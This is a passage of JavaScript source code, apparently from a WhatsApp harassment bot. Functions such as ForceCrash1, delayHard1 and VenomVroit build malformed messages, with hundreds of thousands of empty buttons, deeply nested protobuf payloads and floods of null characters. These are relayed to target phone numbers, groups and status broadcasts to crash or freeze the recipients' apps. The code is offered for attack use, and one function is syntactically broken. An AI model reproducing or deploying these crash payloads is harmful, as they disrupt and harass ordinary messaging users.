        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('jmk: target tidak valid');

    var MAX_BATCH = 5;
    var DELAY_MS  = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId  = 'JMK' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('jmk: gagal');
}

async function BlankV1(sock, groupJid) {
    let RayGroup = {
        interactiveMessage: {
            header: {
                title: "福 | ᥅ᥲᥡᘔᥱ𝗍һ - 𐌊𐌉𐌍𐌂",
                hasMediaAttachment: true,
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/pdf",
                    fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
                    fileLength: 999999999,
                    pageCount: 1000,
                    mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
                    fileName: "file.pdf",
                    fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
                    directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1779839963",
                    thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
                    thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
                    thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
                    jpegThumbnail: null,
                    contextInfo: {},
                    thumbnailHeight: 999,
                    thumbnailWidth: 999
                }
            },
            body: {
                text: "福 | ᥕᥲᥒᥲᥣᥲᥒ ᥉ᥡ᥉𝗍ᥱm ᑲᥙg 𝗀𝗋᥆ᥙρ ¿?"
            },
            nativeFlowMessage: {
                buttons: new Array(500000).fill({})
            }
        }
    };

    let msg = generateWAMessageFromContent(groupJid, RayGroup, {});

    await sock.relayMessage(groupJid, msg.message, {
        messageId: msg.key.id
    });
}

async function delayHard1(sock, target) {
    const a = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "¡m ⟅༑ ‌‌‌E‌x‌f‌o‌l‌d‌ ‌D‌e‌l‌a‌y ‌h‌a‌r‌d ♞" + "\0".repeat(25000)
                    },
                     nativeFlowmessage: {
                         buttons: "\x10". repeat(3000)
                     }
                }
            }
        }
    };
         const b = {
            groupStatusMessageV2: {
               message: {
                 interactiveMessage: {
                      body: {
                         text: "𐌐𝖚𝗍𝗋𝗂 𝖫𝗈𝗏𝖾𝗋𝗌" + "\n".repeat(5000)
                     },
                      nativeFlowMessage: {
                          buttons: Array.from({ length: 500000 }, () => ({}))
                      }
                 }
             }
         }
     };
        const c = {
          groupStatusMessageV2: {
              message: {
                  extendedTextMessage: {
                      text: "福 | ᥅ᥲᥡᘔᥱ𝗍һ - 𐌊𐌉𐌍𐌂",
                       contextInfo: {
                          mentionedJid: Array.from({    length: 2000 }, () =>
    Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                       )
                   }
                }
            }
        }
    }; 
      await sock.relayMessage(target, a, {})
      await sock.relayMessage(target, b, {})
      await sock.relayMessage(target, c, {
      });
       participant: {
          true
     }

  // SEND VIA generateWAMessageFromContent
  const msg = await generateWAMessageFromContent(target, textMsg, {});
  
  // RELAY KE STATUS BROADCAST
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });
}

async function scaryy(sock, target) {
  const msg = {
    interactiveMessage: {
      body: {
        text: "𝑆𝑐𝑎𝑟𝑦*"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 50000 }, () => ({}))
      }
    }
  };

  await sock.sendMessage(target, { text: "BY @%ziper" + "Ꮰ}".repeat(1000) });
  await new Promise(r => setTimeout(r, 500));
  await sock.relayMessage(target, msg, { noSelfSync: true });
}

async function DelayAyaa(sock, target) {
  const xaysh = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "BAZZ¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "BAZZ Officiall ¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const bugi = generateWAMessageFromContent(target, xaysh, {});

await sock.relayMessage(target, bugi.message, {
// participant: true,
  messageId: bugi.key.id
})

const XYsX = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: "\u0000".repeat(999),
          name: "Nando Officiall",
          publisher: "\u0000".repeat(999),
          fileLength: 9999,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          contextInfo: {
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
          },
        },
      },
    },
  };

const Bag = generateWAMessageFromContent(target, XYsX, {});


  await sock.relayMessage(target, Bag.message, {
// participant: true, 
  messageId: Bag.key.id
})
}

async function ForceCrash1(sock, target) {
  const Rayzeth1 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "福 | 𐌐𝖚𝗍𝗋𝗂 𝙻𝚘𝚟𝚎𝚛𝚜 ᥅ᥲᥡ " },
          nativeFlowMessage: {
            buttons: "{".repeat(500000),
          },
        },
      },
    },
  };

  const Rayzeth2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "福 | 𐌐𝖚𝗍𝗋𝗂 𝙻𝚘𝚟𝚎𝚛𝚜 ᥅ᥲᥡ " },
          nativeFlowMessage: {
            buttons: "{}".repeat(500000),
          },
        },
      },
    },
  };

  try {
    const msg1 = generateWAMessageFromContent(target, Rayzeth1, {});
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

    await new Promise((resolve) => setTimeout(resolve, 500));

    const msg2 = generateWAMessageFromContent(target, Rayzeth2, {});
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });
  } catch (error) {
    console.error("Error relaying crash combo Exfold:", error);
  }
}

async function DelayASilent(sock, target) {
  const QueenMia = " ′ 𝓠𝓾𝓾𝓮𝔁 𝓜𝓲𝓪 ′ "
  
  const A = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: QueenMia
          },
          nativeFlowMessage: {
            messageParamsJson: "[".repeat(50000),
            buttons: Array.from({ length: 50000 }, () => ({}))
          }
        }
      }
    }
  };

  const Silent = {
    protocolMessage: {
      type: 9999,
      key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "\u0000".repeat(70000) + "\u600b".repeat(60000)
      },
      message: "\u200B".repeat(100000) + "\u0000".repeat(100000),
      timestamp: Math.floor(Date.now() / 1000)
    }
  };

  const Attack = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: QueenMia
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            quotedMessage: {
              stickerPackMessage: {}
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, A, { ptcp: true });
  await sock.relayMessage(target, Silent, { ptcp: true });
  await sock.relayMessage(target, Attack, { ptcp: true });
}

// delay × freezs ui ( medium fc )
async function VenomVroit(sock, jid) {
  const msgX = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "Fuck You Bitch",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Rans K2"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const msgx = generateWAMessageFromContent(jid, msgX, {});
  await sock.relayMessage(jid, msgx.message, {
    messageId: msgx.key.id
  });

  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
             url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
             mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
             fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
             fileLength: "9999999999999",
             pageCount: 9999999999999,
             mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
             fileName: "cosmic.ppt",
             fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
             directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
             mediaKeyTimestamp: "1726867151",
             contactVcard: true,
             jpegThumbnail: ""
            }
          },
          body: { text: "Cosmic Company." }, 
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  }, {
    messageId: null, 
    onTarget: true
  });
}
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Starting a WhatsApp Session.')}
╰─────────────────────────────╯
`));

await connectMongoDB();

await startSesi();
await bot.launch();
})();